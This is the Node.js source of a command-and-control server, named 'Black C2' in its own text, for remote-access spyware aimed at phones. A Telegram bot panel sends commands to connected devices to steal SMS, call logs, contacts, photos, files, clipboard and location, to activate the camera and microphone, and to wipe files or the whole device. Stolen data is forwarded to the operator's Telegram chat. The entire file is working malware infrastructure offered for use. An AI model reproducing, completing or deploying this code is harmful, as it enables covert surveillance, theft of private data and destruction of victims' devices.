// language: JavaScript (Node.js), file: server.js, runtime: Node.js 16+
// dependencies: express, http, socket.io, node-telegram-bot-api, multer, fs

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

// Load configuration
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// Initialize Express and HTTP server
const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// Initialize Telegram Bot (بدون polling عشان نستخدم webhook)
const bot = new TelegramBot(config.token);

// In-memory storage for connected devices
const devices = new Map();

// --- Multer setup for file uploads ---
const uploader = multer({ dest: 'uploads/' });
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

// --- Middleware ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Helper: Escape HTML ---
function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

// --- Helper: Get active device ---
function getDeviceSocket(deviceId) {
    if (deviceId) return devices.get(deviceId);
    return devices.values().next().value;
}

// --- Routes ---

app.get('/', (req, res) => {
    res.send('Black C2 Server is running.');
});

app.post('/upload', uploader.single('file'), (req, res) => {
    const { originalname, path: filePath } = req.file;
    const deviceId = req.body.id || 'unknown';
    bot.sendDocument(config.id, filePath, {
        caption: `📁 ملف جديد من الجهاز (${escapeHtml(deviceId)}):\n${escapeHtml(originalname)}`,
        parse_mode: 'HTML',
    });
    res.send('Done');
});

// --- Socket.IO: Device Connection & Control ---

io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.id || `device-${Date.now()}`;
    socket.deviceId = deviceId;
    socket.deviceIp = socket.handshake.address;
    devices.set(deviceId, socket);

    bot.sendMessage(config.id, 
        `✯ جهاز جديد متصل\n📱 ID: ${escapeHtml(deviceId)}\n🌐 IP: ${escapeHtml(socket.deviceIp)}\n\n📊 إجمالي الأجهزة: ${devices.size}`,
        { parse_mode: 'HTML' }
    );

    socket.on('disconnect', () => {
        devices.delete(deviceId);
        bot.sendMessage(config.id, 
            `✯ الجهاز انفصل\n📱 ID: ${escapeHtml(deviceId)}\n📊 إجمالي الأجهزة: ${devices.size}`,
            { parse_mode: 'HTML' }
        );
    });

    socket.on('data', (data) => {
        if (data.type === 'text') {
            bot.sendMessage(config.id, `✯ نتيجة من ${escapeHtml(deviceId)}:\n\n${escapeHtml(data.content)}`, { parse_mode: 'HTML' });
        }
    });

    socket.on('screenshot', (imageBase64) => {
        const buffer = Buffer.from(imageBase64, 'base64');
        bot.sendPhoto(config.id, buffer, { caption: `📸 سكرين شوت من ${escapeHtml(deviceId)}` });
    });

    socket.on('location', (data) => {
        const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
        bot.sendMessage(config.id, 
            `📍 موقع الجهاز ${escapeHtml(deviceId)}\n\n🌍 خط العرض: ${data.lat}\n🌍 خط الطول: ${data.lon}\n\n🗺 الخريطة: ${mapLink}`,
            { parse_mode: 'HTML' }
        );
    });
});

// --- Telegram Bot: Main Menu ---

function showMainMenu(chatId) {
    const keyboard = [
        [{ text: '📱 معلومات الجهاز', callback_data: 'info' }],
        [{ text: '📞 المكالمات', callback_data: 'calls' }, { text: '💬 الرسائل', callback_data: 'sms' }],
        [{ text: '📇 جهات الاتصال', callback_data: 'contacts' }, { text: '📸 سحب صور', callback_data: 'photos' }],
        [{ text: '🎬 سحب فيديو', callback_data: 'videos' }, { text: '📁 سحب ملفات', callback_data: 'files' }],
        [{ text: '📲 التطبيقات', callback_data: 'apps' }, { text: '📍 الموقع', callback_data: 'location' }],
        [{ text: '🌐 الشبكة', callback_data: 'network' }, { text: '🔋 البطارية', callback_data: 'battery' }],
        [{ text: '📊 الحساسات', callback_data: 'sensors' }, { text: '📋 الكليبورد', callback_data: 'clipboard' }],
        [{ text: '📷 كاميرا أمامية', callback_data: 'cam_front' }, { text: '📷 كاميرا خلفية', callback_data: 'cam_back' }],
        [{ text: '🔦 تشغيل الفلاش', callback_data: 'flash_on' }, { text: '🔦 إطفاء الفلاش', callback_data: 'flash_off' }],
        [{ text: '📳 تشغيل الاهتزاز', callback_data: 'vib_on' }, { text: '🛑 إيقاف الاهتزاز', callback_data: 'vib_off' }],
        [{ text: '🔊 رفع الصوت', callback_data: 'vol_up' }, { text: '🔇 كتم الصوت', callback_data: 'vol_mute' }],
        [{ text: '💡 زيادة السطوع', callback_data: 'bright_up' }, { text: '🔅 تقليل السطوع', callback_data: 'bright_down' }],
        [{ text: '📸 سكرين شوت', callback_data: 'screenshot' }, { text: '🎤 تسجيل صوتي', callback_data: 'mic' }],
        [{ text: '⚙️ فتح الإعدادات', callback_data: 'settings' }, { text: '📶 فتح الواي فاي', callback_data: 'wifi' }],
        [{ text: '🔒 قفل الشاشة', callback_data: 'lock' }, { text: '🗑 حذف الملفات', callback_data: 'wipe_files' }],
        [{ text: '💥 فرمتة الجهاز', callback_data: 'wipe_device' }],
        [{ text: '🔄 رجوع', callback_data: 'refresh' }]
    ];
    bot.sendMessage(chatId, '✯ لوحة التحكم:', { reply_markup: { inline_keyboard: keyboard } });
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== config.id) return;
    bot.sendMessage(chatId, 
        `✯ أهلاً بك في بوت Black C2\n` +
        `تم تطويره بواسطة: المطورة رزان (@a_yrj)\n\n` +
        `📊 الأجهزة المتصلة: ${devices.size}`,
        { parse_mode: 'HTML' }
    );
    showMainMenu(chatId);
});

bot.onText(/\/menu/, (msg) => {
    if (msg.chat.id !== config.id) return;
    showMainMenu(msg.chat.id);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== config.id) return;
    if (devices.size === 0) {
        bot.sendMessage(chatId, '⚠️ لا توجد أجهزة متصلة حالياً.');
        return;
    }
    let text = `✯ الأجهزة المتصلة (${devices.size}):\n\n`;
    let i = 1;
    for (const [id, socket] of devices) {
        text += `${i++}. ${escapeHtml(id)}\n   IP: ${escapeHtml(socket.deviceIp)}\n\n`;
    }
    bot.sendMessage(chatId, text, { parse_mode: 'HTML' });
});

// --- Callback Query Handler ---

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    if (chatId !== config.id) return bot.answerCallbackQuery(query.id);

    const action = query.data;
    const socket = getDeviceSocket();

    if (!socket) return bot.answerCallbackQuery(query.id, { text: '⚠️ لا يوجد جهاز متصل.' });

    const commandMap = {
        'info': 'info', 'calls': 'get_calls', 'sms': 'get_sms', 'contacts': 'get_contacts',
        'photos': 'get_photos', 'videos': 'get_videos', 'files': 'get_files', 'apps': 'get_apps',
        'location': 'get_location', 'network': 'get_network', 'battery': 'get_battery',
        'sensors': 'get_sensors', 'clipboard': 'get_clipboard', 'cam_front': 'camera_front',
        'cam_back': 'camera_back', 'flash_on': 'flash_on', 'flash_off': 'flash_off',
        'vib_on': 'vibrate_on', 'vib_off': 'vibrate_off', 'vol_up': 'volume_up', 'vol_mute': 'volume_mute',
        'bright_up': 'brightness_up', 'bright_down': 'brightness_down', 'screenshot': 'screenshot',
        'mic': 'record_audio', 'settings': 'open_settings', 'wifi': 'open_wifi', 'lock': 'lock_screen',
        'wipe_files': 'wipe_files'
    };

    if (action === 'refresh') {
        bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
        showMainMenu(chatId);
        return bot.answerCallbackQuery(query.id, { text: '✅ تم التحديث.' });
    }

    if (action === 'wipe_device') {
        bot.sendMessage(chatId, '⚠️ هل أنت متأكد من فرمتة الجهاز؟', {
            reply_markup: { inline_keyboard: [[{ text: '✅ نعم', callback_data: 'confirm_wipe' }, { text: '❌ لا', callback_data: 'cancel' }]] }
        });
        return bot.answerCallbackQuery(query.id);
    }

    if (action === 'confirm_wipe') {
        socket.emit('command', { request: 'wipe_device' });
        bot.sendMessage(chatId, '💥 جاري إرسال أمر الفرمتة...');
        return bot.answerCallbackQuery(query.id, { text: '✅ تم.' });
    }

    if (action === 'cancel') {
        bot.sendMessage(chatId, '❌ تم الإلغاء.');
        return bot.answerCallbackQuery(query.id);
    }

    const cmd = commandMap[action];
    if (cmd) {
        socket.emit('command', { request: cmd });
        bot.answerCallbackQuery(query.id, { text: '✅ تم إرسال الأمر.' });
    } else {
        bot.answerCallbackQuery(query.id, { text: '⚠️ الأمر غير معروف.' });
    }
});

// --- Webhook Setup ---
const webhookUrl = `${config.host}/bot${config.token}`;
app.use(bot.webhookCallback(`/bot${config.token}`));
bot.setWebHook(webhookUrl).then(() => {
    console.log(`Webhook set successfully to: ${webhookUrl}`);
}).catch((err) => {
    console.error(`Webhook error: ${err.message}`);
});

// --- Start Server ---

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Black C2 server is running on port ${PORT}`);
});
